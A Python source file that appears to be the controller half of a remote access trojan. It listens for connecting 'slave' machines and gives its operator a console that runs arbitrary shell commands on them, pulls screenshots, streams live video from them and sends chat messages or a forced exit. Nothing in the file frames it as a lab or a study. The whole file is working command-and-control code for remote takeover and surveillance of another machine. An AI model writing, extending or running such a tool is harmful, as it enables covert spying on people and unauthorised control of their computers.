import socket
import threading
import json
import os
import cv2

HOST = '0.0.0.0'
PORT = 65432

def send_json(sock, data, binary_payload=None):
    msg = json.dumps(data).encode()
    sock.sendall(len(msg).to_bytes(4, 'big') + msg)
    if binary_payload:
        sock.sendall(len(binary_payload).to_bytes(8, 'big') + binary_payload)

def recv_json(sock):
    raw_len = recvall(sock, 4)
    if not raw_len:
        return None
    msg_len = int.from_bytes(raw_len, 'big')
    msg = recvall(sock, msg_len)
    return json.loads(msg.decode())

def recvall(sock, n):
    data = b''
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data

def recv_binary(sock):
    raw_len = recvall(sock, 8)
    if not raw_len:
        return None
    data_len = int.from_bytes(raw_len, 'big')
    return recvall(sock, data_len)

def handle_video(sock):
    print("[*] Starting video stream. Press 'q' in the video window to stop.")
    cv2.namedWindow("Remote Video", cv2.WINDOW_NORMAL)
    try:
        while True:
            frame_bytes = recv_binary(sock)
            if not frame_bytes:
                print("[!] Video stream ended or connection lost.")
                break
            import numpy as np
            np_arr = np.frombuffer(frame_bytes, np.uint8)
            frame = cv2.imdecode(np_arr, cv2.IMREAD_COLOR)
            if frame is not None:
                cv2.imshow("Remote Video", frame)
            if cv2.waitKey(1) & 0xFF == ord('q'):
                send_json(sock, {"type": "video_stop"})
                break
    finally:
        cv2.destroyWindow("Remote Video")

def handle_slave(sock):
    print("[*] Slave connected.")
    while True:
        try:
            cmd = input("host> ").strip()
            if cmd.startswith("command "):
                shell_cmd = cmd[len("command "):]
                send_json(sock, {"type": "command", "command": shell_cmd})
                resp = recv_json(sock)
                print(resp.get("output", resp))
            elif cmd == "screenshot":
                send_json(sock, {"type": "screenshot"})
                resp = recv_json(sock)
                if resp.get("status") == "ok":
                    img_bytes = recv_binary(sock)
                    with open("received_screenshot.png", "wb") as f:
                        f.write(img_bytes)
                    print("[*] Screenshot saved as received_screenshot.png")
                else:
                    print("[!] Screenshot error:", resp.get("error"))
            elif cmd == "video":
                send_json(sock, {"type": "video"})
                resp = recv_json(sock)
                if resp.get("status") == "start":
                    handle_video(sock)
                else:
                    print("[!] Video error:", resp.get("error"))
            elif cmd.startswith("chat "):
                message = cmd[len("chat "):]
                send_json(sock, {"type": "chat", "message": message})
                resp = recv_json(sock)
                print("[*] Chat result:", resp.get("status", resp.get("error")))
            elif cmd == "forceexit":
                send_json(sock, {"type": "forceexit"})
                print("[*] Sent ForceExit command to slave.")
            elif cmd in ("exit", "quit"):
                print("[*] Closing connection.")
                sock.close()
                break
            else:
                print("Available commands:\n  command <shell_command>\n  screenshot\n  video\n  chat <message>\n  forceexit\n  exit")
        except Exception as e:
            print("[!] Error:", e)
            break

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.bind((HOST, PORT))
        server.listen(1)
        print(f"[*] Listening on {HOST}:{PORT} ...")
        while True:
            client_sock, addr = server.accept()
            t = threading.Thread(target=handle_slave, args=(client_sock,))
            t.start()

if __name__ == "__main__":
    import numpy as np  # Needed for video
    main()